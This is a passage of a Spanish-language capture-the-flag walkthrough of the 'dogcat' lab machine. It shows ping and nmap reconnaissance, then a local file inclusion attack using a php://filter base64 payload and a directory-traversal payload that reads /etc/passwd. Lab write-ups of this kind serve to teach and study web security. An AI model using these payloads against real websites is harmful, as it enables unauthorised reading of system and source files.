### Ping
```python
ping -c 1 10.10.183.95
PING 10.10.183.95 (10.10.183.95) 56(84) bytes of data.
64 bytes from 10.10.183.95: icmp_seq=1 ttl=63 time=252 ms

--- 10.10.183.95 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 251.536/251.536/251.536/0.000 ms
```
###### TTL=63 Maquina Linux

### nmap
```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.48 seconds
```

| PORT   | STATE | SERVICE | VERSION                                                      |
| ------ | ----- | ------- | ------------------------------------------------------------ |
| 22/tcp | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.38 ((Debian))                               |
### Enumeración del puerto 80

![[Pasted image 20240228172752.png]]
###### al hacer click en los botones las imagenes y los gatos son aleatorios. tambien tenemos un = por lo que podemos intentar un PATH traversal
![[Pasted image 20240228173259.png]]
###### ok parece que están sanetizando de alguna manera este archivo así que vamos a intentar baypasearlo con una técnica de direcroty traversal 
```python
/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
```
este comando nos ayuda a hacer el llamado al recurso y encodearlo en base64 
![[Pasted image 20240228174008.png]]
###### esta respuesta nos afierma que es vulnerable a esta inyeccion asi que probamos el siguiente
```python
/?view=./dog/../../../../../../../etc/passwd&ext=
```

![[Pasted image 20240228174831.png]]
###### perfecto. miramos el codigo fuente
![[Pasted image 20240228175200.png]]
###### parece que podemos ver el archivo /etc/passwd 
